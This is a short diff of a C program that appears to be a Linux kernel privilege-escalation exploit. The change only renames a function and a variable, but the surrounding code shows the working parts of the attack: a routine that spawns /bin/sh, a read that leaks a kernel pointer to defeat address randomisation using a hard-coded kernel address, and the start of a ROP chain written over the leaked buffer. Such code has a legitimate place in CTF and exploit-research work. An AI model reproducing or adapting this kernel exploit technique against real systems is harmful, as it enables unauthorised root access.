@@ -37,13 +37,13 @@ static void shell(void)
 	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
 }
 
-static void leak_base(int fd, unsigned char *data)
+static void leak_offset(int fd, unsigned char *data)
 {
-	uintptr_t leak_pointer;
+	uintptr_t ptr;
 
 	read(fd, data, 0x410);
-	leak_pointer = *(uintptr_t *)&data[0x408];
-	offset = leak_pointer - 0xffffffff8113d33c;
+	ptr = *(uintptr_t *)&data[0x408];
+	offset = ptr - 0xffffffff8113d33c;
 	printf("[+] offset: %#x\n", offset);
 }
 
@@ -61,7 +61,7 @@ int main(void)
 		return EXIT_FAILURE;
 	}
 
-	leak_base(fd, data);
+	leak_offset(fd, data);
 
 	rop_chain = (uintptr_t *)&data[0x408];
 	*rop_chain++ = OFFSET(pop_rdi_xor_al_0_ret);
